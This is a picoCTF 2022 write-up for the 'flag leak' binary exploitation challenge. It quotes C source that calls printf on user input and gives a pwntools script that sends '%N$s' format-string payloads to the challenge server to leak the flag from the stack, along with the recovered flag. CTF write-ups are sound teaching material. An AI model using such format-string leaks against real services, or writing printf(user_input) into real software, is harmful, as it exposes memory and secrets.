
                           flag leak
					 --------------------------------------		  
                         No soultion

problem URL: 
https://play.picoctf.org/practice/challenge/269
https://www.youtube.com/watch?v=DhVRI33s-D0&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=46

https://github.com/ryan-zhu-music/picoCTF-2022-Writeups/tree/main/Binary%20Exploitation/Flag%20Leak



Description
  Story telling class 1/2 I'm just copying and pasting with this 
     program(vuln):  
	         https://artifacts.picoctf.net/c/91/vuln
  What can go wrong? 
  You can view source here (vuln.c): 
         https://artifacts.picoctf.net/c/91/vuln.c
  And connect with it using:
         nc saturn.picoctf.net 54459
 
Hints:
  Format Strings 
  
 
Solution:
   	1. wget  https://artifacts.picoctf.net/c/91/vuln.c
	   wget  https://artifacts.picoctf.net/c/91/vuln
	   chmod +x vuln
       echo > flag.txt
	   
------------------------------------------------------------------------	   
                        source cod	   
	                 ---------------   

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}					 
					 
---------------------------------------					 
					 
 2. From the source code we can see it will read the flag into flag variable					 
	    
	        printf(story);
    Variables are store in stack, chances are we can leak the flag by utilizing this format
   	string vulnerability.
 3. Next program will do the job:
 
 
--------------------------------------------------- 
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "error"

for x in range(130):
  try: #   port nuber from the picoctf page   54106
    p = remote('saturn.picoctf.net', 54106)
    p.recvuntil(b">> ")
    p.sendline('%{}$s'.format(x).encode())
    p.recvline()
    leaked = p.recvline()
    if b"CTF{" in leaked:
      print("Flag:", leaked)
      break
    else:
      print(leaked)
  except EOFError:
    pass
--------------------------------


	picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

